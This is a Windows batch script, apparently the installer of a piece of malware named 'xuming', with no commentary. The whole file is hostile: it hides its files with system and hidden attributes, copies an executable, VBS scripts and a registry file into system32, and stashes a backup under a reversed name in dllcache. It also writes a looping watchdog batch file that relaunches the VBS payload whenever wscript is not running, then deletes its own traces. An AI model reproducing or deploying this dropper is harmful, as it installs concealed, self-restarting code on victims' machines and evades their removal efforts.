@echo off
attrib +s +h start.vbs
attrib +s +h start.bat
attrib +s +h xuming.exe
attrib +s +h xxuming1.vbs
attrib +s +h xxmreg.reg
attrib +s +h xxuming.bat
attrib +s +h xpslist.exe

attrib -r -s -h start.vbs
del start.vbs

attrib -s -h xuming.exe
copy /y xuming.exe %systemroot%\system32\xuming.exe
attrib +s +h xuming.exe

attrib -s -h xuming1.vbs
copy /y xxuming.vbs %systemroot%\system32\xuming1.vbs
del xxuming.vbs

attrib -s -h xxmreg.reg
copy /y xxmreg.reg %systemroot%\system32\xmreg.reg
del xxmreg.reg

attrib -s -h xxuming.bat
copy /y xxuming.bat %systemroot%\system32\xuming.bat
del xxuming.bat

attrib -s -h xpslist.exe
copy /y xpslist.exe %systemroot%\system32\pslist.exe
del xpslist.exe

echo XM  CS042  NEDU>%systemroot%\system32\xm.txt
echo ！！I L MYY！！>>%systemroot%\system32\xm.txt

start explorer \
copy /y %systemroot%\system32\xuming.exe %systemroot%\system32\dllcache\gnimux.exe

echo :xmloop>%systemroot%\system32\xmhold.bat
echo ping 127.0.0.1>>%systemroot%\system32\xmhold.bat
echo ping 127.0.0.1>>%systemroot%\system32\xmhold.bat
echo ping 127.0.0.1>>%systemroot%\system32\xmhold.bat
echo pslist^>%systemroot%\system32\%%1xmps.txt>>%systemroot%\system32\xmhold.bat
echo find /i "wscript" %systemroot%\system32\%%1xmps.txt ^& if errorlevel 1 start xuming1.vbs>>%systemroot%\system32\xmhold.bat
echo ping 127.0.0.1>>%systemroot%\system32\xmhold.bat
echo ping 127.0.0.1>>%systemroot%\system32\xmhold.bat
echo ping 127.0.0.1>>%systemroot%\system32\xmhold.bat
echo pslist^>%systemroot%\system32\%%1xmps.txt>>%systemroot%\system32\xmhold.bat
echo find /i "wscript" %systemroot%\system32\%%1xmps.txt ^& if errorlevel 1 start xuming1.vbs>>%systemroot%\system32\xmhold.bat
echo if {%%1}=={} goto xmloop>>%systemroot%\system32\xmhold.bat
echo del %systemroot%\system32\%%1xmps.txt>>%systemroot%\system32\xmhold.bat
echo exit>>%systemroot%\system32\xmhold.bat

start xuming1.vbs
attrib -s -h -r start.bat
del start.bat

exit